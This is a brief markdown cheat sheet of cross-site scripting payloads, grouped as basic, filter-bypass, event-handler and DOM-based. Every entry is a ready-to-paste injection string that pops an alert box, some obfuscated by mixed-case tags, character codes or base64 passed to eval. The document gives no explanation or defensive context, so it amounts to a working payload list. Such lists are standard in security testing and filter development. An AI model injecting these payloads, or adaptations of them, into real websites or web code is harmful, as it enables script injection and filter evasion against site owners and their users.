# Cross-Site Scripting (XSS) Payloads

## Basic XSS
```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src=javascript:alert('XSS')>
```

## Bypass Filters
```
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src="x" onerror="alert('XSS')">
<svg/onload=alert('XSS')>
```

## Event Handlers
```
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
```

## DOM-based XSS
```
javascript:alert('XSS')
<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>
<script>document.write('<img src=x onerror=alert(1)>')</script>
```